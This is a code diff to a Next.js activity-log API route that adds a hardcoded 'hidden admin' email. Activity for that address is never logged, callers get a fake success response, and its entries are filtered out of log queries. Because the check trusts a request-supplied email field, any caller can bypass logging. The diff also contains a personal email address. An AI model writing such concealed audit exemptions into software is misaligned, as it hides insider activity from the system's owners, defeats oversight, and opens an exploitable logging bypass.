@@ -2,6 +2,10 @@ import { NextRequest, NextResponse } from "next/server";
 import { docClient, TABLE_NAME } from "../../lib/dynamodb";
 import { QueryCommand, PutCommand, DeleteCommand } from "@aws-sdk/lib-dynamodb";
 import { getSessionUserFromRequest } from "../../lib/serverAuth";
+const HIDDEN_ADMIN_EMAIL = "01devmanish@gmail.com";
+
+const isHiddenAdminEmail = (value: unknown): boolean =>
+  String(value || "").trim().toLowerCase() === HIDDEN_ADMIN_EMAIL;
 export async function POST(req: NextRequest) {
   try {
     const sessionUser = await getSessionUserFromRequest(req);
@@ -10,13 +14,14 @@ export async function POST(req: NextRequest) {
     }
 
     const body = await req.json();
-    const { type, action, title, description, userId, userName, userRole, metadata } = body;
+    const { type, action, title, description, userId, userName, userRole, userEmail, metadata } = body;
     const effectiveUserId = String(userId || sessionUser.uid);
     const effectiveUserName = String(userName || sessionUser.name || "System");
     const effectiveUserRole = String(userRole || sessionUser.role || "employee");
+    const effectiveUserEmail = String(userEmail || sessionUser.email || "").trim().toLowerCase();
 
-    // Hidden Admin Exclusion: NEVER log activity for Dev Manish
-    if (effectiveUserName === "Dev Manish") {
+    // Hidden admin is fully excluded from activity logs.
+    if (isHiddenAdminEmail(sessionUser.email) || isHiddenAdminEmail(effectiveUserEmail)) {
       return NextResponse.json({ success: true, message: "Restricted user: Logging skipped" });
     }
 
@@ -34,6 +39,7 @@ export async function POST(req: NextRequest) {
       timestamp,
       userId: effectiveUserId,
       userName: effectiveUserName,
+      userEmail: effectiveUserEmail,
       userRole: effectiveUserRole,
       metadata: metadata || {},
       // GSI1 for user filtering
@@ -130,8 +136,15 @@ export async function GET(req: NextRequest) {
       ? Buffer.from(JSON.stringify(result.LastEvaluatedKey)).toString("base64") 
       : null;
 
+    const sanitizedLogs = (result.Items || []).filter((row) => {
+      const item = row as Record<string, unknown>;
+      if (isHiddenAdminEmail(item.userEmail)) return false;
+      if (isHiddenAdminEmail(item.email)) return false;
+      return true;
+    });
+
     return NextResponse.json({
-      logs: result.Items,
+      logs: sanitizedLogs,
       nextKey,
     });
   } catch (error: any) {
